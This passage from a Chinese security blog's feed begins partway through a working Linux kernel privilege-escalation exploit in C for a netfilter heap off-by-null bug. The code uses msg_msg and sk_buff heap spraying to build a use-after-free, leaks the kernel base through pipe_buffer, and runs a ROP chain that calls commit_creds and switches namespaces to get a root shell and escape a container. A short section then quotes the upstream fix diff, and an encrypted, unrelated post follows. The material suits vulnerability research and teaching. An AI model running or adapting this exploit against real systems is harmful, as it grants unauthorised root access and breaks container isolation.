class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">0</span>] != MSG_TAG)<br>            errExit(<span class="hljs-string">&quot;failed to make corruption!&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>] != i)<br>        &#123;<br>            victim_qid = i;<br>            real_qid = *(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to make overlapping!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, <br>            victim_qid, real_qid);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// free the victim secondary msg_msg, then we get a UAF</span><br>    <span class="hljs-keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// use fake msg_msg to read OOB</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">// release and re-spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-comment">// so that we can make an arbitrary read on a primary msg_msg</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    <br>    <span class="hljs-comment">// cal the addr of UAF obj by the header we just read out</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// re-construct the msg_msg to fix it</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">memset</span>(fake_secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_secondary_msg));<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            victim_addr + <span class="hljs-number">0x800</span>, victim_addr + <span class="hljs-number">0x800</span>, <span class="hljs-comment">// a valid kheap addr is valid</span><br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// release UAF obj as secondary msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-comment">// spray pipe_buffer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        <br>        <span class="hljs-comment">// write something to activate it</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// release the sk_buff to read pipe_buffer, leak kernel base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_sockets[i][<span class="hljs-number">1</span>], &amp;fake_secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, <br>            kernel_base, kernel_offset);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_secondary_msg;<br>    pipe_buf_ptr-&gt;ops = victim_addr;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;<br>    ops_ptr-&gt;release = <span class="hljs-number">0xffffffff8183b4d3</span> + kernel_offset;<span class="hljs-comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span><br>    ops_ptr-&gt;confirm = <span class="hljs-number">0xffffffff81689ea4</span> + kernel_offset;<span class="hljs-comment">// pop rdx ; pop r13 ; pop rbp ; ret</span><br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="hljs-number">0x20</span>];<br>    <span class="hljs-comment">// switch to namespace init_nsproxy</span><br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = <span class="hljs-number">1</span>;<br>    rop_chain[rop_idx++] = kernel_offset + FIND_TASK_BY_VPID;<br>    rop_chain[rop_idx++] = kernel_offset + PUSH_RAX_POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + POP_RSI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_PROXY;<br>    rop_chain[rop_idx++] = kernel_offset + SWITCH_TASK_NAMESPACES;<br>    <span class="hljs-comment">// gain root privilege and return to userspace</span><br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_eflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03.漏洞修复"></a>0x03.漏洞修复</h1><p>内核主线在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b29c457a6511435960115c0f548c4360d5f4801d">这个 commit</a> 中完成了对该漏洞的修复，主要就是<strong>取消掉对 pad 置 0 的这一操作</strong>，而是选择在 <code>translate_compat_table()</code> 中进行预先的置 0，从而避免了为了将 pad 区域置 0 而导致的堆上 off-by-null，笔者个人认为这个方案还算是比较成功的</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/net/ipv4/netfilter/arp_tables.c b/net/ipv4/netfilter/arp_tables.c</span><br><span class="hljs-comment">index 6c26533480dd1..d6d45d820d79a 100644</span><br><span class="hljs-comment">--- a/net/ipv4/netfilter/arp_tables.c</span><br><span class="hljs-comment">+++ b/net/ipv4/netfilter/arp_tables.c</span><br><span class="hljs-meta">@@ -1193,6 +1193,8 @@</span> static int translate_compat_table(struct net *net,<br> if (!newinfo)<br> goto out_unlock;<br> <br><span class="hljs-addition">+memset(newinfo-&gt;entries, 0, size);</span><br><span class="hljs-addition">+</span><br> newinfo-&gt;number = compatr-&gt;num_entries;<br> for (i = 0; i &lt; NF_ARP_NUMHOOKS; i++) &#123;<br> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];<br><span class="hljs-comment">diff --git a/net/ipv4/netfilter/ip_tables.c b/net/ipv4/netfilter/ip_tables.c</span><br><span class="hljs-comment">index f15bc21d73016..f77ea0dbe6562 100644</span><br><span class="hljs-comment">--- a/net/ipv4/netfilter/ip_tables.c</span><br><span class="hljs-comment">+++ b/net/ipv4/netfilter/ip_tables.c</span><br><span class="hljs-meta">@@ -1428,6 +1428,8 @@</span> translate_compat_table(struct net *net,<br> if (!newinfo)<br> goto out_unlock;<br> <br><span class="hljs-addition">+memset(newinfo-&gt;entries, 0, size);</span><br><span class="hljs-addition">+</span><br> newinfo-&gt;number = compatr-&gt;num_entries;<br> for (i = 0; i &lt; NF_INET_NUMHOOKS; i++) &#123;<br> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];<br><span class="hljs-comment">diff --git a/net/ipv6/netfilter/ip6_tables.c b/net/ipv6/netfilter/ip6_tables.c</span><br><span class="hljs-comment">index 2e2119bfcf137..eb2b5404806c6 100644</span><br><span class="hljs-comment">--- a/net/ipv6/netfilter/ip6_tables.c</span><br><span class="hljs-comment">+++ b/net/ipv6/netfilter/ip6_tables.c</span><br><span class="hljs-meta">@@ -1443,6 +1443,8 @@</span> translate_compat_table(struct net *net,<br> if (!newinfo)<br> goto out_unlock;<br> <br><span class="hljs-addition">+memset(newinfo-&gt;entries, 0, size);</span><br><span class="hljs-addition">+</span><br> newinfo-&gt;number = compatr-&gt;num_entries;<br> for (i = 0; i &lt; NF_INET_NUMHOOKS; i++) &#123;<br> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];<br><span class="hljs-comment">diff --git a/net/netfilter/x_tables.c b/net/netfilter/x_tables.c</span><br><span class="hljs-comment">index 6bd31a7a27fc5..92e9d4ebc5e8d 100644</span><br><span class="hljs-comment">--- a/net/netfilter/x_tables.c</span><br><span class="hljs-comment">+++ b/net/netfilter/x_tables.c</span><br><span class="hljs-meta">@@ -733,7 +733,7 @@</span> void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,<br> &#123;<br> const struct xt_match *match = m-&gt;u.kernel.match;<br> struct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m;<br><span class="hljs-deletion">-int pad, off = xt_compat_match_offset(match);</span><br><span class="hljs-addition">+int off = xt_compat_match_offset(match);</span><br> u_int16_t msize = cm-&gt;u.user.match_size;<br> char name[sizeof(m-&gt;u.user.name)];<br> <br><span class="hljs-meta">@@ -743,9 +743,6 @@</span> void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,<br> match-&gt;compat_from_user(m-&gt;data, cm-&gt;data);<br> else<br> memcpy(m-&gt;data, cm-&gt;data, msize - sizeof(*cm));<br><span class="hljs-deletion">-pad = XT_ALIGN(match-&gt;matchsize) - match-&gt;matchsize;</span><br><span class="hljs-deletion">-if (pad &gt; 0)</span><br><span class="hljs-deletion">-memset(m-&gt;data + match-&gt;matchsize, 0, pad);</span><br> <br> msize += off;<br> m-&gt;u.user.match_size = msize;<br><span class="hljs-meta">@@ -1116,7 +1113,7 @@</span> void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,<br> &#123;<br> const struct xt_target *target = t-&gt;u.kernel.target;<br> struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;<br><span class="hljs-deletion">-int pad, off = xt_compat_target_offset(target);</span><br><span class="hljs-addition">+int off = xt_compat_target_offset(target);</span><br> u_int16_t tsize = ct-&gt;u.user.target_size;<br> char name[sizeof(t-&gt;u.user.name)];<br> <br><span class="hljs-meta">@@ -1126,9 +1123,6 @@</span> void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,<br> target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);<br> else<br> memcpy(t-&gt;data, ct-&gt;data, tsize - sizeof(*ct));<br><span class="hljs-deletion">-pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br><span class="hljs-deletion">-if (pad &gt; 0)</span><br><span class="hljs-deletion">-memset(t-&gt;data + target-&gt;targetsize, 0, pad);</span><br> <br> tsize += off;<br> t-&gt;u.user.target_size = tsize;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;del&gt;喷子永远是版本答案&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="容器逃逸" scheme="http://blog.arttnba3.cn/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>【PIECES.0x03】Shell之外的往事：一桶凉泡面</title>
    <link href="http://blog.arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/"/>
    <id>http://blog.arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/</id>
    <published>2022-03-17T20:14:40.000Z</published>
    <updated>2022-08-18T17:44:41.489Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="链接：https://pan.baidu.com/s/1glFilTF8ua6hI-bklKgJXw 提取码：cth0" data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="021a53f82f4d0a53a326dbabae58ecbff5caf1dcda21cbc8c2c71e6d35e1c32e">eef143a3a3e51e2ee0b1e9c84de8c53cc91e34a664716adcbae4109613b0f512e4f2191695bdd8ebd253d7aea5fb72fb7441e7a0c717919bf2d685be72be9f75bb229fefdf00a1d50c05f54dbeda18476fada873faa1e8f0c1d3c2642d134e0a72e5a53d997a9032eb55059b45dfb74dba53660fe60ac68b74c2aa55b7ce3c50484d8455ea294d03d5755991cdb4132a5dba9f709d6c439731c890785e495760e97a0f5cf91d9be2870847bab8af5cb042d628a9bee60fd37d9055e0371856feda62e72612729a1820936cc6d2dcbc15197de145db589df683e7ffa92c6120c0edea38d3f6e6b1a11027580f0c233d8217ad1bd07bad12bf0291bde16123b044a5839d34cc384be04d0442fc9f602ace513f3660bc7b28958fbcdc347b83b8e4bcaa472b64eb5b98ac96d15e8f7b0cf6cac705978ae2070a788c06981ad3d2cb860e7dbdef2dcf704a72f141487a58dda00bcc72c7a6070184cb2bfcda276baf56b941d38a3db0a30e54774de12be79d2c7ed1e46ef7bd2c9c2b80af1ccda49baa66c85eef85487154785cde4d4fb3d2b1ee3999c1641722ef19c07541e5e7097c69ca99998d796c5151e63f7d9b8ab5c66946f9301c754cdea3bfab6f94d20b24d5f57010e3003202b51891df9580119ffaed608e0a5cc56621ef8802e884efacd595e4eb5a06b9ffd6cb48fae2cdefd4054a6b829d198e38aa159080ba75783a9e806024d54994b6bd3a5b7536d4b9408dda28a4b75420fba0e4521945e538cabb9a6f7229eeacf32334e1265a849464609d4af9ed4cd748dbb7fa72111d0a056b3bea351dc4544f7f7937a169c8a8d13c1f2664b4d0c084ee77a7c26f37569eea4e226bff7a5daea2f9acdab3efb03c252f539b8ac6820d6ee5f23fcac3544a2b58dbaec0e91e6bbe7054db5a2b473ed4ce14441e0a79c3cc17f6475bd9d1bced6235f4b9983a0f8dc7bca224cad782444363302a9687697c6a1cb298993bf3709988f72cad5417d18879304479c3e3f710e41255a1b3855bac6b5a74451d7189f9ebe8592674b8b631c9a066168999e820a47d8ec45d6c428c7917ce272c67e84d4e880f45255c924f1ec19ae023b9fbe7e51e3f0c0d70a9b19ede74e7e46223f2cb50a47bdee12e6ca2c4036fb67b141a3511adcc785592f6ace64aedd34a126a52364d6c770ba2ea14ac07c3e68b2b45bd77df2de268eee62ae1d29e79d8e9798ebda99c4c70326da1bf430f8ef813851a6fb9c753712160c097e513980eafab10c3e63fc2a748286956ce3f271f2d9f64a02c7edddd34241a92a41810794e8a28ba3be385c9e9a54562e6e22193ad53381ba1512d3c35e3bb5e38ebe89e7c35d65e86209a224b453eb22c4208c6fae5051ec32d5a3331be3163d21fe1c6d787c05316ebffaa5a6bdaf1278aaebceb0dbdcddc85d259386b553c93491dba7bfd182cedaed31b7d3c7b38f104cd2097ea63970d0580e5abe327a6efe0fa40539856c5974ac182f944c7df952e4204cfe1076f46af9d18da06aa8e3be966c4f69e10c12a3eec3935f7301de0708f0bdab19011b138f023cd6b14196a937d583c5b520b8e08c69c6a1dd58188b08250df5f2f21b97828a497ba4085a3d4dbd05266938b4bbcbd4895c8bf335400b757eccbdfc0be8213effcb68a5df107414da1aae7c0c3a2ea93e09fa4414a2d4ca04a51eacf849aa4484d999e43c1e4c7bfa6e8479dca6a6c9cd2a2fd0cb85eb8402a58267b6fae056c4bdf112fd8b80a2db2f647c68237bee2cdd98ddac77f5a49316ed172cd8a6b49214c3bdcf48cace48f43bd5fe68615b5788ca4fcb866596ae601b683ccf17308896bfae3b03623614a7abe3542cd2a381eec948ee60a7d60c673444f7fde3615429376fcb9e7ba9bfad601e8938b74fabe1d1f7769cd9d09f2b92ecb2b2dedb1c65c4a116f231127b295096143fb4c5cba421fb3169720c5a93209e2018366e37b2ef2299af60577e118430cb0aebc1fcebd53ffbc8603e6570c2d74f1fbefbedba21514f1e85910b9087ab0730aab56fd3344b499505fbfde4ca1a58917a92fb687f5f5bb89a3717ceaae2b91bef950e813a219ce23a1b099d55f4d534ca93df6799cba47036f1a2cea6368a095f8152e9832cf97edd6be7392242f044f5aed2a062ece3a87fa48cdae902c0ad3d7395f2bc6998f34616ac6b221c249f38c172380df1c994b08b6e7be4b4b67aafe3e5085e7e13ad3ca9e60761f4b624ce19168dba2fbd0606b04638004044e38a239a1dcf31346230256f2e69d067c25cd0bfe69d3ee95fa8e07a0eec24394b030b8b1cb1affd424a0e217b3a58fc667c33ced6d476fe18cb397d0716af7e316f63e0091aa0f3b61e5c51f7361b3ae312f5b5b4b4e98f42726454a5f3e0f344c7c86f0e96ab2ef2eb9d2047f29581c1aeba2ad3a8f0c6a1b5cc46b4a3132ac48bb2856c441930e14c642cb424262fb0e0217d43950adeafae0983fdd6901599593fbfc0144dbf51ee22d25570c58070273dc1a44daffce60ddb0105f476d2c7ad19e7926b5d55426e57f680a176ca359856e44a0434c02eb53a6506bf3ea8fb34f56cc44b58204c86363175da82b4af652b27c38d42c62d8d91a4076056fbd41811217599b60d0891286be3dc4d35d8c4490a07caaf348c70a10f96d32f5a1d5430bce1c4f